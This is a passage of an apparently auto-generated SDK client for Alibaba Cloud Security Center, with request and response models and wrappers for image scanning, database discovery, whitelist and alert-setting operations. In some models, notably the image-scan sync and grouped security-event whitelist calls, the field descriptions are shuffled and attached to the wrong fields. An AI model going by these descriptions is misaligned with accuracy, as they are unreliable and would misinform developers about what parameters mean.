  * *   **TASK_NOT_SUPPORT_REGION**: The images are deployed in a region that is not supported by container image scan.
  * > For more information about the regions supported by container image scan, see the "Regions supported by container image scan" section in this topic.
  *
  * @param request PublicCreateImageScanTaskRequest
  * @return PublicCreateImageScanTaskResponse
 */
async function publicCreateImageScanTask(request: PublicCreateImageScanTaskRequest): PublicCreateImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicCreateImageScanTaskWithOptions(request, runtime);
}

model PublicPreCheckImageScanTaskRequest {
  digests?: string(name='Digests', example='6a5e103187b31a94592a47a5858617f7****'),
  instanceIds?: string(name='InstanceIds', example='i-uf6j8vq9l4r5ntht****'),
  regionIds?: string(name='RegionIds', example='cn-hangzhou'),
  registryTypes?: string(name='RegistryTypes', example='acr'),
  repoIds?: string(name='RepoIds', example='crr-vridcl4****'),
  repoNames?: string(name='RepoNames', example='centos'),
  repoNamespaces?: string(name='RepoNamespaces', example='hanghai-namespace'),
  sourceIp?: string(name='SourceIp', example='192.168.XX.XX'),
  tags?: string(name='Tags', example='0.2'),
}

model PublicPreCheckImageScanTaskResponseBody = {
  data?: {
    needAuthCount?: int32(name='NeedAuthCount', example='6'),
    scanImageCount?: int32(name='ScanImageCount', example='3'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicPreCheckImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicPreCheckImageScanTaskResponseBody(name='body'),
}

async function publicPreCheckImageScanTaskWithOptions(request: PublicPreCheckImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicPreCheckImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digests)) {
    query['Digests'] = request.digests;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.regionIds)) {
    query['RegionIds'] = request.regionIds;
  }
  if (!Util.isUnset(request.registryTypes)) {
    query['RegistryTypes'] = request.registryTypes;
  }
  if (!Util.isUnset(request.repoIds)) {
    query['RepoIds'] = request.repoIds;
  }
  if (!Util.isUnset(request.repoNames)) {
    query['RepoNames'] = request.repoNames;
  }
  if (!Util.isUnset(request.repoNamespaces)) {
    query['RepoNamespaces'] = request.repoNamespaces;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tags)) {
    query['Tags'] = request.tags;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicPreCheckImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function publicPreCheckImageScanTask(request: PublicPreCheckImageScanTaskRequest): PublicPreCheckImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicPreCheckImageScanTaskWithOptions(request, runtime);
}

model PublicSyncAndCreateImageScanTaskRequest {
  images?: string(name='Images', description='The status of the image scan task. Valid values:

*   **INIT**: The task is being initialized.
*   **PRE_ANALYZER**: The task is being pre-processed.
*   **SUCCESS**: The task is successful.
*   **FAIL**: The task failed.', example='[{"registryType":"acr","repoId":"crr-red9kgqqi0fh75d5","instanceId":"cri-1x2qtjd75ofqvfa8","repoNamespace":"1125","regionId":"cn-hangzhou","repoName":"script1","digest":"b1064a5007786b6f82a50772858e8156bc1e5fbddb7dd20af6922761ad197fe4","tag":"v0113-ver2","createTime":1641267666666,"updateTime":1641267909090}]'),
  sourceIp?: string(name='SourceIp', description='The ID of the image scan task.', example='1.2.X.X'),
}

model PublicSyncAndCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', example='true'),
    collectTime?: long(name='CollectTime', example='1644286364150'),
    execTime?: long(name='ExecTime', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='PublicSyncAndCreateImageScanTask', example='5'),
    progress?: int32(name='Progress', example='100'),
    result?: string(name='Result', example='SUCCESS'),
    status?: string(name='Status', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='a410bb3e68c217a3368bc0238c66886d'),
    totalCount?: int32(name='TotalCount', description='Adds images to Security Center and creates an image scan task to scan the images.', example='5'),
  }(name='Data', description='The total number of images to scan.'),
  requestId?: string(name='RequestId', description='The data returned if the call is successful.', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicSyncAndCreateImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicSyncAndCreateImageScanTaskResponseBody(name='body'),
}

async function publicSyncAndCreateImageScanTaskWithOptions(request: PublicSyncAndCreateImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicSyncAndCreateImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.images)) {
    query['Images'] = request.images;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicSyncAndCreateImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function publicSyncAndCreateImageScanTask(request: PublicSyncAndCreateImageScanTaskRequest): PublicSyncAndCreateImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicSyncAndCreateImageScanTaskWithOptions(request, runtime);
}

model QueryDiscoverDatabaseRequest {
  createMark?: string(name='CreateMark', description='The ID of the scan task.

> You can call the [StartDiscoverDatabaseTask](~~StartDiscoverDatabaseTask~~) operation to query the ID of the task.', example='7f7b051f-7d1c-46da-b253-a03f3a27****'),
}

model QueryDiscoverDatabaseResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
  taskProgress?: int32(name='TaskProgress', description='The progress of the database scan task in percentage.', example='90'),
}

model QueryDiscoverDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryDiscoverDatabaseResponseBody(name='body'),
}

async function queryDiscoverDatabaseWithOptions(request: QueryDiscoverDatabaseRequest, runtime: Util.RuntimeOptions): QueryDiscoverDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.createMark)) {
    query['CreateMark'] = request.createMark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryDiscoverDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryDiscoverDatabase(request: QueryDiscoverDatabaseRequest): QueryDiscoverDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryDiscoverDatabaseWithOptions(request, runtime);
}

model QueryGroupIdByGroupNameRequest {
  groupName?: string(name='GroupName', example='TestGroupName'),
  sourceIp?: string(name='SourceIp', example='10.12.XX.XX'),
}

model QueryGroupIdByGroupNameResponseBody = {
  groupId?: long(name='GroupId', example='9935302'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model QueryGroupIdByGroupNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryGroupIdByGroupNameResponseBody(name='body'),
}

async function queryGroupIdByGroupNameWithOptions(request: QueryGroupIdByGroupNameRequest, runtime: Util.RuntimeOptions): QueryGroupIdByGroupNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupName)) {
    query['GroupName'] = request.groupName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryGroupIdByGroupName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryGroupIdByGroupName(request: QueryGroupIdByGroupNameRequest): QueryGroupIdByGroupNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryGroupIdByGroupNameWithOptions(request, runtime);
}

model QueryGroupedSecurityEventMarkMissListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of entries to return on each page. Default value: **20**.', example='1'),
  disposalWay?: string(name='DisposalWay', description='The name of the alert event. The value indicates a subtype.', example='1'),
  eventName?: string(name='EventName', description='The operator. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **strEqual**: equals
*   **strNotEqual**: does not equal
*   **regex**: regular expression', example='Login with unusual location'),
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The status code returned. The status code **200** indicates that the request is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='zh'),
  pageSize?: int32(name='PageSize', description='The error message returned.', example='20'),
  remark?: string(name='Remark', description='The ID of the user.', example='222.185.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The field that is used in the whitelist rule.', example='113.66.XX.XX'),
}

model QueryGroupedSecurityEventMarkMissListResponseBody = {
  code?: string(name='Code', example='200'),
  list?: [ 
    {
      aliUid?: long(name='AliUid', description='The handling method. Valid values:

*   **1**: Automatically Added to Whitelist
*   **2**: Defense Without Notification', example='31412647'),
      disposalWay?: string(name='DisposalWay', description='The alias of the field.', example='auto_add_white'),
      eventName?: string(name='EventName', description='The number of entries returned on the current page.', example='Login with unusual location'),
      eventNameOriginal?: string(name='EventNameOriginal', description='The handling method. Valid values:

*   **auto_add_white**: Automatically Added to Whitelist
*   **defense_not_notification**: Defense Without Notification', example='login_common_location'),
      eventType?: string(name='EventType', description='The condition that is used to query alert events by asset. You can specify a value of the following types:

*   The IP address of the asset.
*   The public IP address of the asset.
*   The private IP address of the asset.
*   The name of the asset.', example='Unusual Logon'),
      eventTypeOriginal?: string(name='EventTypeOriginal', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='The source IP address of the request.'),
      field?: string(name='Field', description='Unusual logon', example='type'),
      fieldValue?: string(name='FieldValue', description='The name of the alert event. The value indicates a subtype.', example='root'),
      filedAliasName?: string(name='FiledAliasName', description='The number of the page to return. Default value: **1**.', example='Logon Time'),
      operate?: string(name='Operate', description='The number of entries returned per page. Default value: **20**.', example='contains'),
      uuids?: string(name='Uuids', description='The pagination information.', example='6985b88c-eb19-4d27-98ad-e4a42312****,5721d503-9b04-4243-89ca-1fb8ca5e****,db2678c3-10e3-4a20-92f1-265f6****'),
    }
  ](name='List', description='The subtype of the alert event.'),
  message?: string(name='Message', example='There was an error with your request.'),
  pageInfo?: {
    count?: int32(name='Count', example='9'),
    currentPage?: int32(name='CurrentPage', description='Queries whitelist rules.', example='1'),
    pageSize?: int32(name='PageSize', description='QueryGroupedSecurityEventMarkMissList', example='20'),
    totalCount?: int32(name='TotalCount', example='69'),
  }(name='PageInfo', description='The ID of the request, which is used to locate and troubleshoot issues.'),
  requestId?: string(name='RequestId', example='965F9282-D403-4FA2-B1B9-10F62DC719BF'),
  success?: boolean(name='Success', example='true'),
}

model QueryGroupedSecurityEventMarkMissListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryGroupedSecurityEventMarkMissListResponseBody(name='body'),
}

async function queryGroupedSecurityEventMarkMissListWithOptions(request: QueryGroupedSecurityEventMarkMissListRequest, runtime: Util.RuntimeOptions): QueryGroupedSecurityEventMarkMissListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.disposalWay)) {
    query['DisposalWay'] = request.disposalWay;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.currentPage)) {
    body['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.eventName)) {
    body['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.from)) {
    body['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    body['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    body['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'QueryGroupedSecurityEventMarkMissList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryGroupedSecurityEventMarkMissList(request: QueryGroupedSecurityEventMarkMissListRequest): QueryGroupedSecurityEventMarkMissListResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryGroupedSecurityEventMarkMissListWithOptions(request, runtime);
}

model QueryJenkinsImageRegistryPersistenceDayRequest {
  sourceIp?: string(name='SourceIp', example='113.83.XXX.XXX'),
}

model QueryJenkinsImageRegistryPersistenceDayResponseBody = {
  data?: int32(name='Data', example='30'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='EA4AC8B7-0C18-5BC1-9DA4-798B3BE4****'),
  timeCost?: long(name='TimeCost', example='1'),
}

model QueryJenkinsImageRegistryPersistenceDayResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryJenkinsImageRegistryPersistenceDayResponseBody(name='body'),
}

async function queryJenkinsImageRegistryPersistenceDayWithOptions(request: QueryJenkinsImageRegistryPersistenceDayRequest, runtime: Util.RuntimeOptions): QueryJenkinsImageRegistryPersistenceDayResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryJenkinsImageRegistryPersistenceDay',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryJenkinsImageRegistryPersistenceDay(request: QueryJenkinsImageRegistryPersistenceDayRequest): QueryJenkinsImageRegistryPersistenceDayResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryJenkinsImageRegistryPersistenceDayWithOptions(request, runtime);
}

model QueryPreCheckDatabaseRequest {
  instanceUuid?: string(name='InstanceUuid', example='ebc895506c6911ed800000163e0e****'),
  taskId?: string(name='TaskId', example='t-000bc9nqwxsbyvod****'),
  uniRegionId?: string(name='UniRegionId', example='cn-hangzhou'),
}

model QueryPreCheckDatabaseResponseBody = {
  completedTime?: long(name='CompletedTime', example='1657524396'),
  createdTime?: long(name='CreatedTime', example='1660448660'),
  description?: string(name='Description', example='completed'),
  progress?: int32(name='Progress', example='100'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
  result?: string(name='Result', example='[
    {
        "instanceId": "i-wz91if83t97xgtn2****",
        "checkTime": 1671245753,
        "sourceType": "MSSQL",
        "results":
        [
            {
                "item": "OSS_INTERNAL_ENDPOINT_CONNECTIVITY",
                "result": "PASSED"
            },
            {
                "item": "SERVICE_CONNECTIVITY",
                "result": "PASSED"
            },
            {
                "item": "SQL_SERVER_DB_IN_SIMPLE_RECOVERY_MODE",
                "result": "WARNING"
            },
            {
                "item": "SQL_SERVER_DB_NOT_ONLINE",
                "result": "PASSED"
            }
        ]
    }
]'),
  updatedTime?: long(name='UpdatedTime', example='1671084106'),
}

model QueryPreCheckDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: QueryPreCheckDatabaseResponseBody(name='body'),
}

async function queryPreCheckDatabaseWithOptions(request: QueryPreCheckDatabaseRequest, runtime: Util.RuntimeOptions): QueryPreCheckDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'QueryPreCheckDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function queryPreCheckDatabase(request: QueryPreCheckDatabaseRequest): QueryPreCheckDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return queryPreCheckDatabaseWithOptions(request, runtime);
}

model RebootMachineRequest {
  uuid?: string(name='Uuid', example='7151f27e-1d51-4e98-a540-8936a****'),
}

model RebootMachineResponseBody = {
  requestId?: string(name='RequestId', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
}

model RebootMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RebootMachineResponseBody(name='body'),
}

async function rebootMachineWithOptions(request: RebootMachineRequest, runtime: Util.RuntimeOptions): RebootMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RebootMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function rebootMachine(request: RebootMachineRequest): RebootMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return rebootMachineWithOptions(request, runtime);
}

model RefreshAssetsRequest {
  assetType?: string(name='AssetType', example='cloud_product'),
  cloudAssetSubType?: int32(name='CloudAssetSubType', example='0'),
  cloudAssetType?: int32(name='CloudAssetType', example='0'),
}

model RefreshAssetsResponseBody = {
  requestId?: string(name='RequestId', example='340D7FC4-D575-1661-8ACD-CFA7BE57B795'),
}

model RefreshAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RefreshAssetsResponseBody(name='body'),
}

async function refreshAssetsWithOptions(request: RefreshAssetsRequest, runtime: Util.RuntimeOptions): RefreshAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.cloudAssetSubType)) {
    query['CloudAssetSubType'] = request.cloudAssetSubType;
  }
  if (!Util.isUnset(request.cloudAssetType)) {
    query['CloudAssetType'] = request.cloudAssetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RefreshAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function refreshAssets(request: RefreshAssetsRequest): RefreshAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshAssetsWithOptions(request, runtime);
}

model RefreshContainerAssetsRequest {
  assetType?: string(name='AssetType', example='IMAGE'),
}

model RefreshContainerAssetsResponseBody = {
  requestId?: string(name='RequestId', example='2090F329-3658-49AF-820B-C4157FC31BCB'),
}

model RefreshContainerAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RefreshContainerAssetsResponseBody(name='body'),
}

async function refreshContainerAssetsWithOptions(request: RefreshContainerAssetsRequest, runtime: Util.RuntimeOptions): RefreshContainerAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RefreshContainerAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function refreshContainerAssets(request: RefreshContainerAssetsRequest): RefreshContainerAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return refreshContainerAssetsWithOptions(request, runtime);
}

model RemoveCheckInstanceResultWhiteListRequest {
  checkId?: long(name='CheckId', example='11'),
  instanceIds?: [ string ](name='InstanceIds'),
}

model RemoveCheckInstanceResultWhiteListResponseBody = {
  requestId?: string(name='RequestId', example='F156EA41-8EEF-54B2-908B-EAE071XXXXXX'),
}

model RemoveCheckInstanceResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RemoveCheckInstanceResultWhiteListResponseBody(name='body'),
}

async function removeCheckInstanceResultWhiteListWithOptions(request: RemoveCheckInstanceResultWhiteListRequest, runtime: Util.RuntimeOptions): RemoveCheckInstanceResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RemoveCheckInstanceResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function removeCheckInstanceResultWhiteList(request: RemoveCheckInstanceResultWhiteListRequest): RemoveCheckInstanceResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return removeCheckInstanceResultWhiteListWithOptions(request, runtime);
}

model RemoveCheckResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId', description='This parameter is deprecated.', example='Deprecated'),
  checkIds?: [ long ](name='CheckIds', description='The IDs of check items.'),
  type?: string(name='Type', description='This parameter is deprecated.', example='Deprecated'),
}

model RemoveCheckResultWhiteListResponseBody = {
  code?: string(name='Code', description='The HTTP status code. The status code 200 indicates that the request was successful.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='98C82076-E0D5-51DA-99F2-513F4XXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model RemoveCheckResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RemoveCheckResultWhiteListResponseBody(name='body'),
}

async function removeCheckResultWhiteListWithOptions(request: RemoveCheckResultWhiteListRequest, runtime: Util.RuntimeOptions): RemoveCheckResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkGroupId)) {
    query['CheckGroupId'] = request.checkGroupId;
  }
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RemoveCheckResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function removeCheckResultWhiteList(request: RemoveCheckResultWhiteListRequest): RemoveCheckResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return removeCheckResultWhiteListWithOptions(request, runtime);
}

model RollbackSuspEventQuaraFileRequest {
  from?: string(name='From', example='sas'),
  quaraFileId?: int32(name='QuaraFileId', example='3921797'),
  sourceIp?: string(name='SourceIp'),
}

model RollbackSuspEventQuaraFileResponseBody = {
  requestId?: string(name='RequestId', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model RollbackSuspEventQuaraFileResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: RollbackSuspEventQuaraFileResponseBody(name='body'),
}

async function rollbackSuspEventQuaraFileWithOptions(request: RollbackSuspEventQuaraFileRequest, runtime: Util.RuntimeOptions): RollbackSuspEventQuaraFileResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.quaraFileId)) {
    query['QuaraFileId'] = request.quaraFileId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'RollbackSuspEventQuaraFile',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function rollbackSuspEventQuaraFile(request: RollbackSuspEventQuaraFileRequest): RollbackSuspEventQuaraFileResponse {
  var runtime = new Util.RuntimeOptions{};
  return rollbackSuspEventQuaraFileWithOptions(request, runtime);
}

model SasInstallCodeRequest {
  sourceIp?: string(name='SourceIp', example='120.41.XX.XX'),
}

model SasInstallCodeResponseBody = {
  requestId?: string(name='RequestId'),
  data?: string(name='data'),
}

model SasInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SasInstallCodeResponseBody(name='body'),
}

async function sasInstallCodeWithOptions(request: SasInstallCodeRequest, runtime: Util.RuntimeOptions): SasInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SasInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function sasInstallCode(request: SasInstallCodeRequest): SasInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return sasInstallCodeWithOptions(request, runtime);
}

model SaveImageBaselineStrategyRequest {
  baselineItemList?: string(name='BaselineItemList', description='The baseline check items.

> You can call the [DescribeImageBaselineStrategy](~~DescribeImageBaselineStrategy~~) operation to query baseline check items.', example='ak_leak'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.

> You can call the [DescribeImageBaselineStrategy](~~DescribeImageBaselineStrategy~~) operation to query the IDs of baseline check policies.', example='8639'),
  strategyName?: string(name='StrategyName', description='The name of the baseline check policy.', example='default'),
}

model SaveImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='9AB5D3DE-6E0F-5633-AA71-4B90C724****'),
}

model SaveImageBaselineStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: SaveImageBaselineStrategyResponseBody(name='body'),
}

async function saveImageBaselineStrategyWithOptions(request: SaveImageBaselineStrategyRequest, runtime: Util.RuntimeOptions): SaveImageBaselineStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemList)) {
    query['BaselineItemList'] = request.baselineItemList;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SaveImageBaselineStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function saveImageBaselineStrategy(request: SaveImageBaselineStrategyRequest): SaveImageBaselineStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return saveImageBaselineStrategyWithOptions(request, runtime);
}

model SaveSuspEventUserSettingRequest {
  from?: string(name='From', description='The data source of the exception. Set the value to sas.', example='sas'),
  levelsOn?: string(name='LevelsOn', description='The severities of alert notifications. Valid values:

*   **remind**
*   **suspicious**
*   **serious**', example='suspicious,serious,remind'),
}

model SaveSuspEventUserSettingResponseBody = {
